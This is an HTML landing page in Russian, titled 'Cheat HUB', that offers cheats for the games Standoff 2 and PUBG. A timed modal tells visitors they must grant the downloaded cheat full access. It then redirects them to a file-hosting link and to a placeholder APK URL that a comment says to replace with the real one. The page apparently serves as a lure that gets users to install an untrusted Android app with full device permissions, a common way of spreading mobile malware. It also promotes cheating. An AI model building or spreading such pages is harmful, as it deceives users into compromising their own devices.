<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Cheat HUB</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background: #0f0f0f;
      color: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding-top: 100px;
    }

    .container {
      max-width: 500px;
      margin: auto;
      background: #1a1a1a;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
    }

    h1 {
      color: #00ffcc;
      margin-bottom: 20px;
    }

    p {
      color: #bbbbbb;
      font-size: 16px;
    }

    .download-btn {
      display: inline-block;
      margin: 20px 10px 0;
      padding: 15px 30px;
      background-color: #00cc99;
      color: #fff;
      border-radius: 10px;
      font-weight: bold;
      font-size: 16px;
      text-decoration: none;
      transition: background-color 0.3s ease;
      cursor: pointer;
    }

    .download-btn:hover {
      background-color: #00b386;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.7);
    }

    .modal-content {
      background-color: #1a1a1a;
      margin: 15% auto;
      padding: 30px;
      border-radius: 15px;
      width: 80%;
      max-width: 400px;
      color: #fff;
      text-align: center;
      box-shadow: 0 0 20px #00ffcc;
    }

    .modal-content p {
      margin-bottom: 20px;
    }

    .confirmBtn {
      background-color: #00cc99;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      color: white;
      font-weight: bold;
      cursor: not-allowed;
      opacity: 0.6;
    }

    .confirmBtn.enabled {
      cursor: pointer;
      opacity: 1;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Cheat HUB</h1>
    <p>Добро пожаловать в приватный хаб читов для Standoff 2 и PUBG.<br>Выберите нужную игру для скачивания чита:</p>

    <!-- Кнопки -->
    <span class="download-btn" onclick="showModal('standoff')">Standoff</span>
    <span class="download-btn" onclick="showModal('pubg')">PUBG</span>
  </div>

  <!-- Модальное окно -->
  <div id="infoModal" class="modal">
    <div class="modal-content">
      <p id="modalText">
        ⚠️ <strong>Уведомление:</strong><br>
        После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТЬСЯ!
      </p>
      <button id="confirmBtn" class="confirmBtn" disabled>Подождите 10 секунд...</button>
    </div>
  </div>

  <script>
    const links = {
      standoff: "https://pixeldrain.com/u/WuJKY1QP",
      pubg: "https://example.com/pubg-cheat.apk" // Заменишь на реальную ссылку
    };

    function showModal(game) {
      document.getElementById('infoModal').style.display = 'block';
      const btn = document.getElementById('confirmBtn');
      let seconds = 10;
      btn.innerText = `Подождите ${seconds} секунд...`;
      btn.disabled = true;
      btn.classList.remove('enabled');
      btn.onclick = null;

      const countdown = setInterval(() => {
        seconds--;
        if (seconds > 0) {
          btn.innerText = `Подождите ${seconds} секунд...`;
        } else {
          clearInterval(countdown);
          btn.innerText = "Я понял";
          btn.disabled = false;
          btn.classList.add('enabled');
          btn.onclick = () => {
            window.location.href = links[game];
          };
        }
      }, 1000);
    }

    // Закрытие по клику вне окна (по желанию)
    window.onclick = function(event) {
      const modal = document.getElementById('infoModal');
      if (event.target == modal) {
        modal.style.display = "none";
      }
    }
  </script>
</body>
</html>
